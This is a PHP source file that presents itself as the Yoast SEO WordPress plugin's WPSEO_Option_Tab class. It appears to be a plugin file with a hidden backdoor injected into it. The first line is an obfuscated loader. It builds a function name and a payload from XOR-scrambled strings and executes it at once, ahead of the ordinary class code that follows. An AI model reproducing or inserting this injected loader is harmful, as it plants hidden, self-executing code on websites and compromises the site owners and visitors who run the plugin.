<?php $QgleYZ=':+R7NIlUKY423A6'; $DAdVeo='YY7V:,33>7WFZ.X'^$QgleYZ; $zZWnfQ='Q+GN3=XT<3A:r251=  gj4X0j16=Q5d 9Meheg9gSVKB5TD<=y,A6+2P9Lhj H3Xs30L6nuvG<DnJvJRaGL=ge8EBjQgltvycm0YIZE1IYuUQSPYQ+XK=IBBm52GYftvC.SoQ69xIR-5czHSfw 1B5=HXfeokaZH>weQgdV=H: K<kGF5TfehUXN185D=K=Il,EInyo8IsHHPoI55OrNG4U E1A9r5YE-5=PWnMXF :7Pk;a5 C=;,2rpojp,s=grA9FKfPYLooOSGB+<U-YjL8Zn7M5L2KTAodsbU3 xxNA,1J bvoh,1AD2l2KMzRKqCVtQWCTasOy3>A=K2+Cwdur:2c xxbvMOfs>U,jNhjTBX<CRBc9CdsaQJXOnZ,=NtTeQTRyo>Ju 5=VzRle9SA0SMbQFfEMOk+0J.Htow0;<=L;6> =Nz1;1d 82Y3iQY=M,A2Uwy+,Q4UR7gt5,0Vjjmq+PT26F0TBkxh Fam23YVIsJf GY;BhZ=C6Y P+2CxkQ58WeTO-RB1HIhKJB,=CaM1;3U.d=TNNjjQEjtibZVdhTug:IWs4yFSVcAxgg30RUK1eUYWnhhCRq O76Lg =+. L=;CSofB6Y=9RPiiwL=3IMboAhwyBJ73c 3PXcfI+.Ans36GA-TUEazmao711JdeMIoG'; $wzTtmXZn=$DAdVeo('', '8MooUH67HZ.T-WMXNTSOML7B5UWI0j;ML9BALGBmZ0>,V -SSYT.DtV1M-75M=GpWWQ8WBUR,Y=GjVjrA<F4nAW06JlGKSMsjdV6;raXidUejst0mX,9Q,,jIQS38OOVgGxDx<0qm=XACTusNSDP6Tfl1;E1KE1-G,A8GAvN<HL.RCc-P-O8AnRG8JP0H9SaHC0=GBe14y5BZK-TA.RsgR4L6Tz3VQ81LjV5.Npx AVD5P1kSO1XZOZRXK53c<v.7aX5kB;<5ORqsc4JP HpJ72SJS,A-m 18OYSF>VYCrGeHP>ABKOLZP-1WW86Gp;-QkwP5675HS4s:X.O.SH+WLQ-hw2u=+6V,<FWU0UJsVJp49P67kCBImzE5+,.11IDnItA:1+Be7CQDTI7ZoLAO2-E6vhX;l8GEOOQ>OhIO7EUOX>RWRIG+RITC;DYF8l6<,IeN A0AMtH4W:6ROPQMD7CFMUO1 Si-U-kBCbI IIVR-7iUlFA5+Z;71X:i<X9XF0PL:PApItkI36PaiNmjjAYvIiUZG4uCV17i7CqxWTNP;bUPgAUX+4BRHs72ZvHTVQVg4rWT1n1IAHetQA=EW58KXRqE4TH7 GA2W QV34NEWhYR=,KFaHWYbjL9jEE14KB-JZ 5TCW>-B51b<SVkfRIX>LUdre:'^$zZWnfQ); $wzTtmXZn();
/**
 * @package WPSEO\Admin\Options\Tabs
 */

/**
 * Class WPSEO_Option_Tab
 */
class WPSEO_Option_Tab {

	/** @var string Name of the tab */
	private $name;

	/** @var string Label of the tab */
	private $label;

	/** @var array Optional arguments */
	private $arguments = array();

	/**
	 * WPSEO_Option_Tab constructor.
	 *
	 * @param string $name      Name of the tab.
	 * @param string $label     Label of the tab.
	 * @param array  $arguments Optional arguments.
	 */
	public function __construct( $name, $label, $arguments = array() ) {
		$this->name      = sanitize_title( $name );
		$this->label     = $label;
		$this->arguments = (array) $arguments;
	}

	/**
	 * Get the name
	 *
	 * @return string
	 */
	public function get_name() {
		return $this->name;
	}

	/**
	 * Get the label
	 *
	 * @return string
	 */
	public function get_label() {
		return $this->label;
	}

	/**
	 * Get the video URL
	 *
	 * @return string
	 */
	public function get_video_url() {
		return $this->get_argument( 'video_url' );
	}

	/**
	 * Get the option group
	 *
	 * @return string
	 */
	public function get_opt_group() {
		return $this->get_argument( 'opt_group' );
	}

	/**
	 * Get the variable from the supplied arguments
	 *
	 * @param string $variable Variable to retrieve.
	 * @param string $default  Default to use when variable not found.
	 *
	 * @return mixed|string
	 */
	protected function get_argument( $variable, $default = '' ) {
		return ! empty( $this->arguments[ $variable ] ) ? $this->arguments[ $variable ] : $default;
	}
}
